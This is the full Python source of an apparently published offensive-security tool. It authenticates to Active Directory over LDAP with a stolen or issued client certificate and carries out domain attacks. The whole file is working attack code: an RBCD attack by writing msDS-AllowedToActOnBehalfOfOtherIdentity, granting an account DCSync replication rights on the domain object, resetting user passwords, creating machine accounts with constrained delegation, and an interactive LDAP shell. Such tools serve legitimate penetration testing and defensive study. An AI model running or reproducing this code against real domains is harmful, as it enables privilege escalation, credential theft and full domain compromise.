#!/usr/bin/env python3
#
# Almond (almond.consulting). Copyright (C) 2022 Almond. All rights reserved.
#
# Accompanying blog post: https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html
#
# This software is provided under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# Description:
#   This script implements LDAP certificate authentication for two impacket scripts : addComputer.py and rbcd.py.
#
#   If you use Certipy (https://github.com/ly4k/Certipy) to retrieve certificates, you can extract key and cert from the pfx by using:
#       $ certipy cert -pfx user.pfx -nokey -out user.crt
#       $ certipy cert -pfx user.pfx -nocert -out user.key
#
# Author:
#   drm (@lowercase_drm) / ThePirateWhoSmellsOfSunflowers
#
#   based on :
#        JaGoTu (@jagotu) work on https://github.com/SecureAuthCorp/impacket/blob/master/examples/addcomputer.py
#        Remi Gascou (@podalirius_) and Charlie Bromberg (@_nwodtuhs) work on https://github.com/SecureAuthCorp/impacket/blob/master/examples/rbcd.py
#        Impacket by SecureAuth https://github.com/SecureAuthCorp/impacket
#

import sys
import copy
import string
import random
import logging
import argparse

import ssl
import ldap3
import ldapdomaindump

from impacket import version
from impacket.examples import logger
from impacket.examples.ldap_shell import LdapShell as _LdapShell
from impacket.ldap import ldaptypes
from impacket.uuid import string_to_bin

class LdapShell(_LdapShell):
    def __init__(self, tcp_shell, domain_dumper, client):
        super().__init__(tcp_shell, domain_dumper, client)

        self.use_rawinput = True
        self.shell = tcp_shell

        self.prompt = "\n# "
        self.tid = None
        self.intro = "Type help for list of commands"
        self.loggedIn = True
        self.last_output = None
        self.completion = []
        self.client = client
        self.domain_dumper = domain_dumper

    def do_dump(self, line):
        logging.warning("Not implemented")

    def do_exit(self, line):
        print("Bye!")
        return True


class DummyDomainDumper:
    def __init__(self, root: str):
        self.root = root


def ldap_shell(ldap_server, ldap_conn):
    root = ldap_server.info.other["defaultNamingContext"][0]
    domain_dumper = DummyDomainDumper(root)
    ldap_shell = LdapShell(sys, domain_dumper, ldap_conn)
    try:
        ldap_shell.cmdloop()
    except KeyboardInterrupt:
        print("Bye!\n")
        pass


def create_empty_sd():
    sd = ldaptypes.SR_SECURITY_DESCRIPTOR()
    sd['Revision'] = b'\x01'
    sd['Sbz1'] = b'\x00'
    sd['Control'] = 32772
    sd['OwnerSid'] = ldaptypes.LDAP_SID()
    # BUILTIN\Administrators
    sd['OwnerSid'].fromCanonical('S-1-5-32-544')
    sd['GroupSid'] = b''
    sd['Sacl'] = b''
    acl = ldaptypes.ACL()
    acl['AclRevision'] = 4
    acl['Sbz1'] = 0
    acl['Sbz2'] = 0
    acl.aces = []
    sd['Dacl'] = acl
    return sd

# Create an ALLOW ACE with the specified sid
def create_allow_ace(sid, guid_str=False):
    nace = ldaptypes.ACE()
    nace['AceType'] = ldaptypes.ACCESS_ALLOWED_ACE.ACE_TYPE
    nace['AceFlags'] = 0x00
    acedata = ldaptypes.ACCESS_ALLOWED_ACE()
    acedata['Mask'] = ldaptypes.ACCESS_MASK()
    acedata['Mask']['Mask'] = 983551  # Full control
    acedata['Sid'] = ldaptypes.LDAP_SID()
    acedata['Sid'].fromCanonical(sid)
    if guid_str:
        acedata['ObjectType'] = string_to_bin(guid_str)
        acedata['ObjectTypeLen'] = len(string_to_bin(guid_str))
        acedata['InheritedObjectTypeLen'] = 0
        acedata['InheritedObjectType'] = b''
    acedata['Flags'] = 1
    nace['Ace'] = acedata
    return nace

class RBCD(object):
    """docstring for setrbcd"""

    def __init__(self, ldap_server, ldap_session, delegate_to):
        super(RBCD, self).__init__()
        self.ldap_server = ldap_server
        self.ldap_session = ldap_session
        self.delegate_from = None
        self.delegate_to = delegate_to
        self.SID_delegate_from = None
        self.DN_delegate_to = None
        logging.debug('Initializing domainDumper()')
        cnf = ldapdomaindump.domainDumpConfig()
        cnf.basepath = None
        self.domain_dumper = ldapdomaindump.domainDumper(self.ldap_server, self.ldap_session, cnf)

    def read(self):
        # Get target computer DN
        result = self.get_user_info(self.delegate_to)
        if not result:
            logging.error('Account to modify does not exist! (forgot "$" for a computer account? wrong domain?)')
            return
        self.DN_delegate_to = result[0]

        # Get list of allowed to act
        self.get_allowed_to_act()

        return

    def write(self, delegate_from):
        self.delegate_from = delegate_from

        # Get escalate user sid
        result = self.get_user_info(self.delegate_from)
        if not result:
            logging.error('Account to escalate does not exist! (forgot "$" for a computer account? wrong domain?)')
            return
        self.SID_delegate_from = str(result[1])

        # Get target computer DN
        result = self.get_user_info(self.delegate_to)
        if not result:
            logging.error('Account to modify does not exist! (forgot "$" for a computer account? wrong domain?)')
            return
        self.DN_delegate_to = result[0]

        # Get list of allowed to act and build security descriptor including previous data
        sd, targetuser = self.get_allowed_to_act()

        # writing only if SID not already in list
        if self.SID_delegate_from not in [ ace['Ace']['Sid'].formatCanonical() for ace in sd['Dacl'].aces ]:
            sd['Dacl'].aces.append(create_allow_ace(self.SID_delegate_from))
            self.ldap_session.modify(targetuser['dn'],
                                     {'msDS-AllowedToActOnBehalfOfOtherIdentity': [ldap3.MODIFY_REPLACE,
                                                                                   [sd.getData()]]})
            if self.ldap_session.result['result'] == 0:
                logging.info('Delegation rights modified successfully!')
                logging.info('%s can now impersonate users on %s via S4U2Proxy', self.delegate_from, self.delegate_to)
            else:
                if self.ldap_session.result['result'] == 50:
                    logging.error('Could not modify object, the server reports insufficient rights: %s',
                                  self.ldap_session.result['message'])
                elif self.ldap_session.result['result'] == 19:
                    logging.error('Could not modify object, the server reports a constrained violation: %s',
                                  self.ldap_session.result['message'])
                else:
                    logging.error('The server returned an error: %s', self.ldap_session.result['message'])
        else:
            logging.info('%s can already impersonate users on %s via S4U2Proxy', self.delegate_from, self.delegate_to)
            logging.info('Not modifying the delegation rights.')
        # Get list of allowed to act
        self.get_allowed_to_act()
        return

    def remove(self, delegate_from):
        self.delegate_from = delegate_from

        # Get escalate user sid
        result = self.get_user_info(self.delegate_from)
        if not result:
            logging.error('Account to escalate does not exist! (forgot "$" for a computer account? wrong domain?)')
            return
        self.SID_delegate_from = str(result[1])

        # Get target computer DN
        result = self.get_user_info(self.delegate_to)
        if not result:
            logging.error('Account to modify does not exist! (forgot "$" for a computer account? wrong domain?)')
            return
        self.DN_delegate_to = result[0]

        # Get list of allowed to act and build security descriptor including that data
        sd, targetuser = self.get_allowed_to_act()

        # Remove the entries where SID match the given -delegate-from
        sd['Dacl'].aces = [ace for ace in sd['Dacl'].aces if self.SID_delegate_from != ace['Ace']['Sid'].formatCanonical()]
        self.ldap_session.modify(targetuser['dn'],
                                 {'msDS-AllowedToActOnBehalfOfOtherIdentity': [ldap3.MODIFY_REPLACE, [sd.getData()]]})

        if self.ldap_session.result['result'] == 0:
            logging.info('Delegation rights modified successfully!')
        else:
            if self.ldap_session.result['result'] == 50:
                logging.error('Could not modify object, the server reports insufficient rights: %s',
                              self.ldap_session.result['message'])
            elif self.ldap_session.result['result'] == 19:
                logging.error('Could not modify object, the server reports a constrained violation: %s',
                              self.ldap_session.result['message'])
            else:
                logging.error('The server returned an error: %s', self.ldap_session.result['message'])
        # Get list of allowed to act
        self.get_allowed_to_act()
        return

    def flush(self):
        # Get target computer DN
        result = self.get_user_info(self.delegate_to)
        if not result:
            logging.error('Account to modify does not exist! (forgot "$" for a computer account? wrong domain?)')
            return
        self.DN_delegate_to = result[0]

        # Get list of allowed to act
        sd, targetuser = self.get_allowed_to_act()

        self.ldap_session.modify(targetuser['dn'], {'msDS-AllowedToActOnBehalfOfOtherIdentity': [ldap3.MODIFY_REPLACE, []]})
        if self.ldap_session.result['result'] == 0:
            logging.info('Delegation rights flushed successfully!')
        else:
            if self.ldap_session.result['result'] == 50:
                logging.error('Could not modify object, the server reports insufficient rights: %s',
                              self.ldap_session.result['message'])
            elif self.ldap_session.result['result'] == 19:
                logging.error('Could not modify object, the server reports a constrained violation: %s',
                              self.ldap_session.result['message'])
            else:
                logging.error('The server returned an error: %s', self.ldap_session.result['message'])
        # Get list of allowed to act
        self.get_allowed_to_act()
        return

    def get_allowed_to_act(self):
        # Get target's msDS-AllowedToActOnBehalfOfOtherIdentity attribute
        self.ldap_session.search(self.DN_delegate_to, '(objectClass=*)', search_scope=ldap3.BASE,
                                 attributes=['SAMAccountName', 'objectSid', 'msDS-AllowedToActOnBehalfOfOtherIdentity'])
        targetuser = None
        for entry in self.ldap_session.response:
            if entry['type'] != 'searchResEntry':
                continue
            targetuser = entry
        if not targetuser:
            logging.error('Could not query target user properties')
            return

        try:
            sd = ldaptypes.SR_SECURITY_DESCRIPTOR(
                data=targetuser['raw_attributes']['msDS-AllowedToActOnBehalfOfOtherIdentity'][0])
            if len(sd['Dacl'].aces) > 0:
                logging.info('Accounts allowed to act on behalf of other identity:')
                for ace in sd['Dacl'].aces:
                    SID = ace['Ace']['Sid'].formatCanonical()
                    SamAccountName = self.get_sid_info(ace['Ace']['Sid'].formatCanonical())[1]
                    logging.info('    %-10s   (%s)' % (SamAccountName, SID))
            else:
                logging.info('Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty')
        except IndexError:
            logging.info('Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty')
            # Create DACL manually
            sd = create_empty_sd()
        return sd, targetuser

    def get_user_info(self, samname):
        self.ldap_session.search(self.domain_dumper.root, '(sAMAccountName=%s)' % ldap3.utils.conv.escape_filter_chars(samname), attributes=['objectSid'])
        try:
            dn = self.ldap_session.entries[0].entry_dn
            sid = ldap3.protocol.formatters.formatters.format_sid(self.ldap_session.entries[0]['objectSid'].raw_values[0])
            return dn, sid
        except IndexError:
            logging.error('User not found in LDAP: %s' % samname)
            return False

    def get_sid_info(self, sid):
        self.ldap_session.search(self.domain_dumper.root, '(objectSid=%s)' % ldap3.utils.conv.escape_filter_chars(sid), attributes=['samaccountname'])
        try:
            dn = self.ldap_session.entries[0].entry_dn
            samname = self.ldap_session.entries[0]['samaccountname']
            return dn, samname
        except IndexError:
            logging.error('SID not found in LDAP: %s' % sid)
            return '[Could not resolve SID]', '[Could not resolve SID]'


class ManageUser:
    """docstring for ManageUser"""
    def __init__(self, ldapConn, cmdLineOptions):
        self.ldapConn = ldapConn
        self.__accountName = cmdLineOptions.target
        self.__domain = cmdLineOptions.domain
        self.__baseDN = cmdLineOptions.baseDN

        if self.__baseDN is None:
             # Create the baseDN
            domainParts = self.__domain.split('.')
            self.__baseDN = ''
            for i in domainParts:
                self.__baseDN += 'dc=%s,' % i
            # Remove last ','
            self.__baseDN = self.__baseDN[:-1]

        if not '.' in self.__domain:
            logging.warning('\'%s\' doesn\'t look like a FQDN. Generating baseDN will probably fail.' % self.__domain)

        if not self.LDAPUserExists(self.__accountName):
            raise Exception("sAMAccountName %s not found in %s!" % (self.__accountName, self.__baseDN))

        self.__targetDN, self.__targetSID = self.LDAPGetUser(self.__accountName)

    def LDAPUserExists(self, accountName):
        res, _ = self.LDAPGetUser(accountName)
        return res

    def LDAPGetUser(self, accountName):
        self.ldapConn.search(self.__baseDN, \
                             '(sAMAccountName=%s)' % ldap3.utils.conv.escape_filter_chars(accountName), \
                             attributes=['objectSid'])
        try:
            dn = self.ldapConn.entries[0].entry_dn
            sid = ldap3.protocol.formatters.formatters.format_sid(self.ldapConn.entries[0]['objectSid'].raw_values[0])
            return dn, sid
        except IndexError:
            logging.error('User not found in LDAP: %s' % accountName)
            return False, ''

    def elevate(self, forestDN=None): # implementation was inspired by @skelsec's `msldap` code
        if forestDN is None:
            forestDN = self.__baseDN

        res = self.ldapConn.search(search_base=self.__baseDN, \
                                   search_filter=f'(distinguishedName={forestDN})', \
                                   attributes=['nTSecurityDescriptor'])
        if res is None:
            logging.error('Failed to get forest\'s SD')

        baseDN_sd = self.ldapConn.entries[0].entry_raw_attributes
        if baseDN_sd['nTSecurityDescriptor'] == []:
            raise Exception("User doesn't have right read nTSecurityDescriptor!")

        sd = ldaptypes.SR_SECURITY_DESCRIPTOR(data=baseDN_sd['nTSecurityDescriptor'][0])
        new_sd = copy.deepcopy(sd)

        for guid in ['1131f6aa-9c07-11d1-f79f-00c04fc2dcd2', \
                     '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2', \
                     '89e95b76-444d-4c62-991a-0facbeda640c']:
            new_sd['Dacl'].aces.append(create_allow_ace(self.__targetSID, guid))

        res = self.ldapConn.modify(forestDN, \
                                   {'nTSecurityDescriptor': [ldap3.MODIFY_REPLACE, [new_sd.getData()]]})
        if not res:
            if self.ldapConn.result['result'] == ldap3.core.results.RESULT_INSUFFICIENT_ACCESS_RIGHTS:
                raise Exception("User doesn't have right to modify %s!" % (self.__targetDN))
            elif self.ldapConn.result['result'] == ldap3.core.results.RESULT_UNWILLING_TO_PERFORM:
                raise Exception("Unwilling to Perform: %s" % (self.ldapConn.result['message']))
            else:
                raise Exception(str(ldapConn.result))
        else:
            logging.info("Granted user '%s' DCSYNC rights!" % (self.__accountName))

    def changePWD(self, newPWD):
        if newPWD is False:
            newPWD = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(32))
        res = self.ldapConn.modify(self.__targetDN, \
                                   {'unicodePwd': [(ldap3.MODIFY_REPLACE, ['"{}"'.format(newPWD).encode('utf-16-le')])]})
        if not res:
            if self.ldapConn.result['result'] == ldap3.core.results.RESULT_INSUFFICIENT_ACCESS_RIGHTS:
                raise Exception("User doesn't have right to modify %s!" % (self.__targetDN))
            elif self.ldapConn.result['result'] == ldap3.core.results.RESULT_NO_SUCH_OBJECT:
                raise Exception("Target DN '%s' is not correct!" % (self.__targetDN))
            elif self.ldapConn.result['result'] == ldap3.core.results.RESULT_UNWILLING_TO_PERFORM:
                raise Exception("Password complexity not met. Unwilling to Perform: %s" % (self.ldapConn.result['message']))
            else:
                raise Exception(str(self.ldapConn.result))
        else:
            logging.info("Successfully changed %s password to: %s" % (self.__accountName, newPWD))


class ManageComputer:
    def __init__(self, ldapConn, cmdLineOptions):
        self.options = cmdLineOptions
        self.ldapConn = ldapConn
        self.__action = cmdLineOptions.action
        self.__domain = cmdLineOptions.domain
        self.__computerName = cmdLineOptions.computer_name
        self.__computerPassword = cmdLineOptions.computer_pass
        self.__domainNetbios = cmdLineOptions.domain_netbios
        self.__baseDN = cmdLineOptions.baseDN
        self.__computerGroup = cmdLineOptions.computer_group

        if self.__computerName is None:
            if self.__action in ('modify_computer','delete_computer'):
                raise ValueError("You have to provide a computer name when using modify_computer or delete_computer.")
        else:
            if self.__computerName[-1] != '$':
                self.__computerName += '$'

        if not '.' in self.__domain:
            logging.warning('\'%s\' doesn\'t look like a FQDN. Generating baseDN will probably fail.' % self.__domain)

        if self.__computerPassword is None:
            self.__computerPassword = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(32))

        if self.__domainNetbios is None:
            self.__domainNetbios = self.__domain

        if self.__baseDN is None:
             # Create the baseDN
            domainParts = self.__domain.split('.')
            self.__baseDN = ''
            for i in domainParts:
                self.__baseDN += 'dc=%s,' % i
            # Remove last ','
            self.__baseDN = self.__baseDN[:-1]

        if self.__computerGroup is None:
            self.__computerGroup = 'CN=Computers,' + self.__baseDN

        logging.debug('The new computer will be added in %s' % self.__computerGroup)

    def whoami(self):
        current_user = self.ldapConn.extend.standard.who_am_i()
        if current_user == None:
            raise Exception('whoami command failed, certificate seems not trusted by the Active Directory')
        # LDAP whoami returns an authzId, so we strip the prefix
        logging.info('You are logged in as: %s' % current_user[2:])

    def add_computer(self, constrained_delegations = None):
        if self.__computerName is not None:
            if self.LDAPComputerExists(self.ldapConn, self.__computerName):
                raise Exception("Account %s already exists! If you just want to set a password, use -no-add." % self.__computerName)
        else:
            while True:
                self.__computerName = self.generateComputerName()
                if not self.LDAPComputerExists(self.ldapConn, self.__computerName):
                    break


        computerHostname = self.__computerName[:-1]
        computerDn = ('CN=%s,%s' % (computerHostname, self.__computerGroup))

        # Default computer SPNs
        spns = [
            'HOST/%s' % computerHostname,
            'HOST/%s.%s' % (computerHostname, self.__domain),
            'RestrictedKrbHost/%s' % computerHostname,
            'RestrictedKrbHost/%s.%s' % (computerHostname, self.__domain),
        ]
        ucd = {
            'dnsHostName': '%s.%s' % (computerHostname, self.__domain),
            'userAccountControl': 0x1000,
            'servicePrincipalName': spns,
            'sAMAccountName': self.__computerName,
            'unicodePwd': ('"%s"' % self.__computerPassword).encode('utf-16-le')
        }

        # Add constrained delegations fields to the computer
        if constrained_delegations and len(constrained_delegations) > 0:
            # Set the TRUSTED_TO_AUTH_FOR_DELEGATION and WORKSTATION_TRUST_ACCOUNT flags
            # MS doc: https://learn.microsoft.com/fr-fr/troubleshoot/windows-server/identity/useraccountcontrol-manipulate-account-properties
            ucd['userAccountControl'] = 0x1000000|0x1000
            # Set the list of services authorized (format: protocol/FQDNserver)
            ucd['msDS-AllowedToDelegateTo'] = constrained_delegations.split(',') #Split multiple services in the command line
            logging.info("Adding constrained delegations services to the computer object: %s" % constrained_delegations)

        res = self.ldapConn.add(computerDn, ['top','person','organizationalPerson','user','computer'], ucd)
        if not res:
            if self.ldapConn.result['result'] == ldap3.core.results.RESULT_UNWILLING_TO_PERFORM:
                error_code = int(self.ldapConn.result['message'].split(':')[0].strip(), 16)
                if error_code == 0x216D:
                    raise Exception("User machine quota exceeded!")
                else:
                    raise Exception(str(self.ldapConn.result))
            elif self.ldapConn.result['result'] == ldap3.core.results.RESULT_INSUFFICIENT_ACCESS_RIGHTS:
                raise Exception("User doesn't have right to create a machine account!")
            elif self.ldapConn.result['result'] == ldap3.core.results.RESULT_CONSTRAINT_VIOLATION:
                raise Exception("User doesn't have right to create constrained delegations!")
            else:
                raise Exception(str(self.ldapConn.result))
        else:
            logging.info("Successfully added machine account %s with password %s." % (self.__computerName, self.__computerPassword))

    def delete_computer(self):
        if not self.LDAPComputerExists(self.ldapConn, self.__computerName):
            raise Exception("Account %s not found in %s!" % (self.__computerName, self.__baseDN))

        computer = self.LDAPGetComputer(self.ldapConn, self.__computerName)
        res = self.ldapConn.delete(computer.entry_dn)
        if not res:
            if self.ldapConn.result['result'] == ldap3.core.results.RESULT_INSUFFICIENT_ACCESS_RIGHTS:
                raise Exception("User doesn't have right to delete %s!" % (self.__computerName))
            else:
                raise Exception(str(self.ldapConn.result))
        else:
            logging.info("Successfully deleted %s." % self.__computerName)

    def modify_computer(self):
        if not self.LDAPComputerExists(self.ldapConn, self.__computerName):
            raise Exception("Account %s not found in %s!" % (self.__computerName, self.__baseDN))

        computer = self.LDAPGetComputer(self.ldapConn, self.__computerName)
        res = self.ldapConn.modify(computer.entry_dn, {'unicodePwd': [(ldap3.MODIFY_REPLACE, ['"{}"'.format(self.__computerPassword).encode('utf-16-le')])]})
        if not res:
            if self.ldapConn.result['result'] == ldap3.core.results.RESULT_INSUFFICIENT_ACCESS_RIGHTS:
                raise Exception("User doesn't have right to modify %s!" % (self.__computerName))
            else:
                raise Exception(str(self.ldapConn.result))
        else:
            logging.info("Successfully set password of %s to %s" % (self.__computerName, self.__computerPassword))

    def LDAPComputerExists(self, connection, computerName):
        connection.search(self.__baseDN, '(sAMAccountName=%s)' % computerName)
        return len(connection.entries) ==1

    def LDAPGetComputer(self, connection, computerName):
        connection.search(self.__baseDN, '(sAMAccountName=%s)' % computerName)
        return connection.entries[0]

    def generateComputerName(self):
        return 'DESKTOP-' + (''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(8)) + '$')

# Process command-line arguments.
if __name__ == '__main__':
    # Init the example's logger theme
    logger.init()
    print((version.BANNER))

    parser = argparse.ArgumentParser(add_help = True, description = "Manage domain computers and perform RBCD attack via LDAP certificate authentication")
    parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')

    parser.add_argument('-port', type=int, choices=[389, 636], default=636,
                       help='Destination port to connect to. LDAPS (via StartTLS) on 386 or LDAPS on 636.')

    group = parser.add_argument_group('Action')
    group.add_argument('-action', choices=['add_computer', 'del_computer', 'modify_computer', 'read_rbcd', 'write_rbcd', 'remove_rbcd', 'flush_rbcd', 'modify_user', 'whoami', 'ldap-shell'], nargs='?', default='whoami')

    group = parser.add_argument_group('Manage User')
    group.add_argument('-target', action='store', metavar='sAMAccountName', help='sAMAccountName of user to target.')
    group.add_argument('-new-pass',  action='store', metavar='Password', help='New password of target.', const=False, nargs='?')
    group.add_argument('-elevate', action='store_true', help='Grant target account DCSYNC rights')

    group = parser.add_argument_group('Manage Computer')
    group.add_argument('-baseDN', action='store', metavar='DC=test,DC=local', help='Set baseDN for LDAP.'
                                                                                    'If omitted, the domain part (FQDN) '
                                                                                    'specified in the account parameter will be used.')
    group.add_argument('-computer-group', action='store', metavar='CN=Computers', help='Group to which the account will be added.'
                                                                                        'If omitted, CN=Computers will be used,')

    group.add_argument('-domain', action='store', metavar='test.local', help='Target domain fqdn')
    group.add_argument('-domain-netbios', action='store', metavar='NETBIOSNAME', help='Domain NetBIOS name. Required if the DC has multiple domains.')
    group.add_argument('-computer-name', action='store', metavar='COMPUTER-NAME$', help='Name of computer to add.'
                                                                                 'If omitted, a random DESKTOP-[A-Z0-9]{8} will be used.')
    group.add_argument('-computer-pass', action='store', metavar='password', help='Password to set to computer. '
                                                                                 'If omitted, a random [A-Za-z0-9]{32} will be used.')
    group.add_argument('-delegated-services', type=str, action='store', metavar='cifs/srv01.domain.local,ldap/srv01.domain.local', help='Services to configure in constrained delegation to configure to the new computer (no space in the list)')

    group = parser.add_argument_group('RBCD attack')
    group.add_argument("-delegate-to", type=str, required=False,
                        help="Target computer account the attacker has at least WriteProperty to")
    group.add_argument("-delegate-from", type=str, required=False,
                        help="Attacker controlled machine account to write on the msDS-Allo[...] property (only when using `-action write`)")

    group = parser.add_argument_group('Authentication')
    group.add_argument('-dc-host', action='store',metavar = "hostname",  help='Hostname of the domain controller to use. '
                                                                              'If omitted, the domain part (FQDN) '
                                                                              'specified in the account parameter will be used')
    group.add_argument('-dc-ip', action='store',metavar = "ip",  help='IP of the domain controller to use. '
                                                                      'Useful if you can\'t translate the FQDN.')
    group.add_argument('-crt', action="store", required=True, metavar = "user.crt", help='User\'s certificate')
    group.add_argument('-key', action="store", required=True, metavar = "user.key", help='User\'s private key')

    if len(sys.argv)==1:
        parser.print_help()
        sys.exit(1)

    options = parser.parse_args()

    if options.debug is True:
        logging.getLogger().setLevel(logging.DEBUG)
        # Print the Library's installation path
        logging.debug(version.getInstallationPath())
    else:
        logging.getLogger().setLevel(logging.INFO)

    try:
        if options.crt in ('', None) or options.key in ('', None):
            logging.critical('Cert and key should be specified!')
            sys.exit(1)

        if options.domain in ('', None) and options.baseDN in ('', None):
            logging.critical('The target domain FQDN (-domain) or a base DN (-baseDN) should be specified!')
            sys.exit(1)

        if options.dc_ip:
            target = options.dc_ip
        else:
            target = options.dc_host

        tls = ldap3.Tls(local_private_key_file=options.key, local_certificate_file=options.crt, validate=ssl.CERT_NONE)

        ldap_server_kwargs = {'use_ssl': options.port == 636,
                              'port': options.port,
                              'get_info': ldap3.ALL,
                              'tls': tls}

        ldapServer = ldap3.Server(target, **ldap_server_kwargs)

        ldap_connection_kwargs = dict()

        if options.port == 389:
            # I don't really know why, but using this combination of parameters with ldap3 will
            # send a LDAP_SERVER_START_TLS_OID and trigger a StartTLS
            ldap_connection_kwargs = {'authentication': ldap3.SASL,
                                      'sasl_mechanism': ldap3.EXTERNAL,
                                      'auto_bind': ldap3.AUTO_BIND_TLS_BEFORE_BIND}

        ldapConn = ldap3.Connection(ldapServer, **ldap_connection_kwargs)

        if options.port == 636:
            # According to Microsoft :
            # "If the client establishes the SSL/TLS-protected connection by means of connecting
            # on a protected LDAPS port, then the connection is considered to be immediately
            # authenticated (bound) as the credentials represented by the client certificate.
            # An EXTERNAL bind is not allowed, and the bind will be rejected with an error."
            # Using bind() function will raise an error, we just have to open() the connection
            ldapConn.open()

        if options.action in ('modify_user'):
            if options.target is None:
                logging.critical('-target is required !')
                sys.exit(1)
            manage = ManageUser(ldapConn, options)
            if options.elevate:
                manage.elevate()
            elif options.new_pass is not None:
                manage.changePWD(options.new_pass)
            else:
                logging.critical('User modification option (-elevate|-new-pass) needed!')

        elif options.action in ('add_computer','del_computer','modify_computer', 'whoami', 'ldap-shell'):
            manage = ManageComputer(ldapConn, options)
            if options.action == 'add_computer':
                manage.add_computer(options.delegated_services)
            elif options.action == 'del_computer':
                manage.delete_computer()
            elif options.action == 'modify_computer':
                manage.modify_computer()
            elif options.action == 'whoami':
                manage.whoami()
            elif options.action == "ldap-shell":
                ldap_shell(ldapServer, ldapConn)

        else:
            if options.delegate_to is None:
                logging.critical('-delegate-to is required !')
                sys.exit(1)

            rbcd = RBCD(ldapServer, ldapConn, options.delegate_to)
            if options.action == 'read_rbcd':
                rbcd.read()
            elif options.action == 'write_rbcd':
                rbcd.write(options.delegate_from)
            elif options.action == 'remove_rbcd':
                rbcd.remove(options.delegate_from)
            elif options.action == 'flush_rbcd':
                rbcd.flush()

    except Exception as e:
        if logging.getLogger().level == logging.DEBUG:
            import traceback
            traceback.print_exc()
        print(str(e))
